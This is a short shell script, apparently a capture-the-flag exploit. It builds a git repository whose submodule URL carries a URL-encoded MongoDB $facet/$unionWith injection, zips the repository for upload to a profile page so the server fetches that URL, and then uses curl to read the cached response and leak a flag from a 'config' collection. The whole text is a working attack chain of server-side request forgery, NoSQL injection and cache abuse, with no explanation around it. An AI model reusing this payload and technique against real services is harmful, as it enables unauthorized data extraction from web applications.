
#############################################################
# create malcious git repo 
mkdir test ; cd test 

git init

# Create initial commit
echo "test" > test.txt
git add test.txt
git commit -m "Initial commit"

# Create empty commit to get a valid hash
git commit --allow-empty -m "Empty commit"
EMPTY_COMMIT=$(git rev-parse HEAD)

# Create .gitmodules file
# # { filter: { $facet: { flag: [ { $unionWith: "config" } ] } } }
echo '[submodule "leak"]
    path = leak
    url = http://127.0.0.1/api/search.js?debug=true&filter=%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D#' > .gitmodules
git add .gitmodules
git commit -m "Add submodule configuration"

# Register the submodule properly using the empty commit hash
echo -ne "160000 commit $EMPTY_COMMIT\tleak" | git update-index --index-info
git commit -m "Register submodule"

# Configure the submodule
git config -f .git/config submodule.leak.url 'http://127.0.0.1/api/search.js?debug=true&filter=%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D#'
git config -f .git/config submodule.leak.path leak
git config -f .git/config submodule.leak.active true


############################################################
zip -r exploit test     

# upload this zip file in profile page

########################################################
# request the same url cuz it will be cached 
curl "http://127.0.0.1/api/search.js?debug=true&filter=%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D"
